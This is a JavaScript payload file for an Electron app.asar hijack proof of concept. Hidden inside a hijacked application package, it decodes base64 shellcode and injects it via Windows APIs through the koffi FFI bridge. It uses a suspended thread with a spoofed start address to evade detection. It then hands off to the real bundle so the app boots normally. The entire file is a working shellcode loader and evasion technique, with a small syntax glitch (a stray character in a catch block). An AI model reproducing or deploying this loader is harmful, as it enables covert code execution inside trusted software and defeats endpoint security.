// stage.js — payload for the .asar hijack PoC.
'use strict';

const os = require('os');
const fs = require('fs');
const path = require('path');
const {shellcodeB64} = require('./shellcode');

// Decode only at load time
const shellcode = Buffer.from(shellcodeB64, 'base64');

const marker = path.join(os.tmpdir(), 'asar_poc_proof.log');
const line = (s) => { try { fs.appendFileSync(marker, s); } catch (_) {} };

// koffi is a Node-API FFI bridge: JS declares C signatures and koffi marshals
// arguments into a loaded DLL. Its native part is either packed in app.asar
// (Electron extracts it to %TEMP% on first require) or, when built with
// KOFFI_UNPACK=1, shipped in app.asar.unpacked.
let koffi = null;
try {
  koffi = require('koffi');
  line(`koffi    : loaded (napi ${process.versions.napi})\n`);
} catch (e) {d
  line(`koffi load failed: ${e.stack}\n`);
}

const CONTEXT_SIZE = 0x4D0;
const CONTEXT_FLAGS_OFF = 0x30;
const CONTEXT_RCX_OFF = 0x80;
const CONTEXT_INTEGER_CONTROL = 0x100003; // CONTEXT_INTEGER | CONTEXT_CONTROL (AMD64)

function spoofedThreadLoad() {
  const kernel32 = koffi.load('kernel32.dll');
  const ntdll    = koffi.load('ntdll.dll');
  const ucrtbase = koffi.load('ucrtbase.dll');

  const VirtualAlloc = kernel32.func(
    'void* __stdcall VirtualAlloc(void *addr, size_t size, uint32_t type, uint32_t protect)'
  );
  const VirtualProtect = kernel32.func(
    'bool __stdcall VirtualProtect(void *addr, size_t size, uint32_t newProtect, uint32_t *oldProtect)'
  );
  const GetThreadContext = kernel32.func('bool __stdcall GetThreadContext(void *hThread, void *lpContext)');
  const SetThreadContext = kernel32.func('bool __stdcall SetThreadContext(void *hThread, void *lpContext)');
  const ResumeThread     = kernel32.func('uint32_t __stdcall ResumeThread(void *hThread)');
  const memcpy = ucrtbase.func('void* memcpy(void *dst, const void *src, size_t count)');
  const RtlCreateUserThread = ntdll.func(
    'int32_t __stdcall RtlCreateUserThread(void *ProcessHandle, void *SecurityDescriptor, bool CreateSuspended, uint32_t ZeroBits, size_t MaximumStackSize, size_t CommittedStackSize, void *StartRoutine, void *Parameter, void *ThreadHandle, void *ClientId)'
  );

  // plain name and lib.symbol() returns its raw address as a BigInt pointer. 
  // Preparing the fake address
  const FakeAddress = ntdll.symbol('RtlClearThreadWorkOnBehalfTicket');

  const entry = VirtualAlloc(null, shellcode.length, 0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
  if (!entry) throw new Error('VirtualAlloc failed');
  memcpy(entry, shellcode, shellcode.length);
  const oldProtect = Buffer.alloc(4);
  if (!VirtualProtect(entry, shellcode.length, 0x20 /* PAGE_EXECUTE_READ */, oldProtect)) {
    throw new Error('VirtualProtect failed');
  }

  // spawn the thread suspended with StartRoutine = FakeAddress
  // Set RCX to execute allocated shellcode 
  const hThreadSlot = Buffer.alloc(8); // HANDLE out
  const status = RtlCreateUserThread(
    0xFFFFFFFFFFFFFFFFn,
    null,                
    true,              
    0, 0, 0,             
    FakeAddress,         
    null,                
    hThreadSlot,
    null                 
  );
  if (status < 0) throw new Error(`RtlCreateUserThread failed: 0x${(status >>> 0).toString(16)}`);
  const hThread = hThreadSlot.readBigUInt64LE(0);

  // Rcx = payload entry -> SetThreadContext.
  const ctx = Buffer.alloc(CONTEXT_SIZE);
  ctx.writeUInt32LE(CONTEXT_INTEGER_CONTROL, CONTEXT_FLAGS_OFF);
  if (!GetThreadContext(hThread, ctx)) throw new Error('GetThreadContext failed');
  ctx.writeBigUInt64LE(entry, CONTEXT_RCX_OFF);
  if (!SetThreadContext(hThread, ctx)) throw new Error('SetThreadContext failed');

  if (ResumeThread(hThread) === 0xFFFFFFFF) throw new Error('ResumeThread failed');
  line(`thread  : fake start 0x${FakeAddress.toString(16)} -> entry 0x${entry.toString(16)}\n`);
}

try {
  if (!koffi) throw new Error('koffi is not loaded');
  spoofedThreadLoad();
  line(`[${new Date().toISOString()}] payload running on spoofed thread\n`);
} catch (e) {
  line(`loader error: ${e.stack}\n`);
}

// Chain to the genuine bootstrapper so the app boots normally.
/* !! THIS COULD CHANGE BETWEEN APPLICATION !! */
module.exports = require('./bundle.js');
